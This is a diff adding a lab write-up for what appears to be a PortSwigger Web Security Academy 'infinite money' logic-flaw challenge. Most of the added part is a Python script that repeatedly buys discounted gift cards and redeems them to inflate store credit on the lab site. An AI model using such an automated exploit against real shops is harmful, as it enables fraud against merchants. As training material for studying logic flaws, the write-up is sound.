@@ -205,3 +205,146 @@ You'll get the error `invalid csrf token` . Ignore it and visit `/admin` and del
 
 
 ### Solve
+
+The logic flaw exists in the purchasing flow so that is what we are going to focus on. There exist an item `gift card` at $10 each. We also have a coupon `Signup30` that gives 30% off when we checkout.
+
+#### The Infinite money flaw
+
+1. Our initial store credit:
+
+![](images/22222.png)
+
+2. After Checking out the gift card:
+
+![](images/2443.png)
+
+3. After applying the Gift Card:
+
+![](images/ererr.png)
+
+So for every checkout -> Redeeming , we get an extra $3 . We need $1237 more so that we can buy the jacket . That is 413 runs . Or instead of buying 1 giftcard at a time , we can buy 10.
+
+I automated(had help from claude) the process using a script
+
+```python
+import re
+import time
+import requests
+
+BASE = "https://0ae6009603321ad980509417005200d1.web-security-academy.net"
+SESSION_COOKIE = "WCcK27OpKBsLCqHtOrNsrP0UaM4ii0yo" 
+PRODUCT_ID = 2
+QUANTITY = 10
+COUPON = "SIGNUP30"
+TARGET_BALANCE = 1500.0
+MIN_BALANCE_PER_CYCLE = 70.0  
+
+s = requests.Session()
+s.cookies.set("session", SESSION_COOKIE, domain=BASE.replace("https://", ""))
+s.headers.update({
+    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:157.0) Gecko/20100101 Firefox/157.0",
+    "Content-Type": "application/x-www-form-urlencoded",
+})
+
+def get_csrf(path):
+    r = s.get(BASE + path)
+    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
+    if not m:
+        raise RuntimeError(f"Couldn't find CSRF token on {path}:\n{r.text[:500]}")
+    return m.group(1)
+
+
+def get_balance():
+    r = s.get(BASE + "/my-account?id=wiener")
+    m = re.search(r'Store credit:\s*\$([\d.]+)', r.text)
+    if not m:
+        raise RuntimeError(f"Couldn't parse balance:\n{r.text[:800]}")
+    return float(m.group(1))
+
+
+def add_to_cart():
+    csrf_page = s.get(BASE + f"/product?productId={PRODUCT_ID}")  
+    data = {"productId": PRODUCT_ID, "redir": "PRODUCT", "quantity": QUANTITY}
+    r = s.post(BASE + "/cart", data=data)
+    r.raise_for_status()
+
+
+def apply_coupon():
+    csrf = get_csrf("/cart")
+    data = {"csrf": csrf, "coupon": COUPON}
+    r = s.post(BASE + "/cart/coupon", data=data)
+    r.raise_for_status()
+
+
+def checkout():
+    csrf = get_csrf("/cart")
+    data = {"csrf": csrf}
+    r = s.post(BASE + "/cart/checkout", data=data)  
+    r.raise_for_status()
+    return r.text
+
+
+def extract_gift_codes(confirmation_html):
+    marker = "You have bought the following gift cards"
+    idx = confirmation_html.find(marker)
+    section = confirmation_html[idx:] if idx != -1 else confirmation_html
+    all_codes = re.findall(r'<td>([A-Za-z0-9]{10})</td>', section)
+    return all_codes[:QUANTITY] 
+
+
+def redeem_gift_code(code):
+    csrf = get_csrf("/my-account?id=wiener")
+    data = {"csrf": csrf, "gift-card": code}
+    r = s.post(BASE + "/gift-card", data=data)
+    r.raise_for_status()
+    return r.text
+
+
+def run_cycle():
+    print("Adding 10 gift cards to cart...")
+    add_to_cart()
+    print("Applying SIGNUP30 coupon...")
+    apply_coupon()
+    print("Checking out...")
+    confirmation_html = checkout()
+
+    codes = extract_gift_codes(confirmation_html)
+    print(f"This order's codes: {codes}")
+
+    if len(codes) != QUANTITY:
+        raise RuntimeError(
+            f"Expected {QUANTITY} codes, got {len(codes)} — "
+            f"page format may have changed.\n{confirmation_html[:1500]}"
+        )
+
+    for code in codes:
+        print(f"Redeeming {code}...")
+        redeem_gift_code(code)
+        time.sleep(0.1)
+
+
+def main():
+    balance = get_balance()
+    print(f"Starting balance: ${balance:.2f}")
+    cycles = 0
+    while balance < TARGET_BALANCE:
+        if balance < MIN_BALANCE_PER_CYCLE:
+            raise RuntimeError(f"Balance ${balance:.2f} too low to afford next cycle (${MIN_BALANCE_PER_CYCLE})")
+        run_cycle()
+        cycles += 1
+        new_balance = get_balance()
+        print(f"Cycle {cycles} done. Balance: ${new_balance:.2f}")
+        if new_balance <= balance:
+            raise RuntimeError("Balance didn't increase — logic flaw path may have broken, stopping to avoid infinite loop")
+        balance = new_balance
+    print(f"Target reached in {cycles} cycles. Final balance: ${balance:.2f}")
+
+
+if __name__ == "__main__":
+    main()
+```
+
+Finally buy the jacket:
+
+![](images/45rgrbv.png)
+
